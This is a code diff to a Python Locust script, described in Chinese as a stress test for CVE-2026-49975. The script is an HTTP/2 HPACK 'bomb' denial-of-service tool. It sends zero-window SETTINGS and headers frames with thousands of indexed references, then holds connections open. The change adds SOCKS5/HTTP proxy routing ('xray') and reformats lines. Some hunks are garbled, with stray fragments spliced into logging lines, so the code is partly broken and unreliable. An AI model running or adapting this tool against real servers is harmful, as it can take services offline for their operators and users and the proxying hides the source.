@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
 CVE-2026-49975 专用压测脚本
+支持 SOCKS5 / HTTP 代理
 """
 
 from locust import User, task, constant, events
@@ -107,8 +108,9 @@ def build_frame(frame_type, flags, stream_id, payload):
 
 
 def build_settings(initial_window_size=0, max_frame_size=16384):
-    payload = struct.pack(">HI", 0x04, initial_window_size) + struct.pack(">HI", 0x05, max_frame_size)
-    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, payload)
+    p = struct.pack(">HI", 0x04, initial_window_size)
+    p += struct.pack(">HI", 0x05, max_frame_size)
+    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, p)
 
 
 def build_headers_frame(stream_id, indexed_references=2048):
@@ -164,10 +166,17 @@ class Http2BombUser(User):
         exception = None
 
         try:
-            sock = create_connection((hostname, port), timeout=10.0, proxy_params=PROXY_PARAMS)
+            sock = create_connection(
+                (hostname, port),
+                timeout=10.0,
+                proxy_params=PROXY_PARAMS
+            )
 
             if use_tls:
-                sock = self._get_ssl_ctx().wrap_socket(sock, server_hostname=hostname)
+                sock = self._get_ssl_ctx().wrap_socket(
+                    sock,
+                    server_hostname=hostname
+                )
 
             sock.sendall(CLIENT_PREFACE)
             sock.sendall(build_settings(initial_window_size=0))
@@ -201,11 +210,13 @@ class Http2BombUser(User):
 
             total_time = int((time.time() - start_time) * 1000)
             proxy_name = "xray" if PROXY_URL else "direct"
-            request_name = f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s, via={proxy_name})"
+            req_name = "/ (refs=" + str(self.references_per_stream)
+            req_name += ", hold=" + str(self.hold_seconds) + "s"
+            req_name += ", via=" + proxy_name + ")"
 
             self.environment.events.request.fire(
                 request_type="H2-BOMB",
-                name=request_name,
+                name=req_name,
                 response_time=total_time,
                 response_length=0,
                 exception=exception,
@@ -218,20 +229,13 @@ def on_test_start(environment, **kw):
     proxy_display = PROXY_URL if PROXY_URL else "直连"
     logger.info("=" * 60)
     logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
-    logger.info(f"  并发用户数     : {environment.runner.target_user_count}")
-    logger.info(f"  HPACK 引用次数 : {REFERENCES}")
-    logger.info(f"  连接保持秒数   : {HOLD_SECONDS}")
-    logger.info(f"  目标地址       : {environment.host}")
-    logger.info(f"  代理设置       : {proxy_display}")
-    logger.info(f"  测试时长       : {environment.runner.run_time}秒")
-    logger.info("=" * 60)s}s, via={proxy_name})"
-
-            self.environment.events.request.fire(
-                request_type="H2-BOMB",
-                name=request_name,
-                response_time=total_time,
-                response_length=0,
-                exception=exception,
+    logger.info("  并发用户数     : " + str(environment.runner.target_user_count))
+    logger.info("  HPACK 引用次数 : " + str(REFERENCES))
+    logger.info("  连接保持秒数   : " + str(HOLD_SECONDS))
+    logger.info("  目标地址       : " + str(environment.host))
+    logger.info("  代理设置       : " + proxy_display)
+    logger.info("  测试时长       : " + str(environment.runner.run_time) + "秒")
+    logger.info("=" * 60)  exception=exception,
                 context={},
             )
 
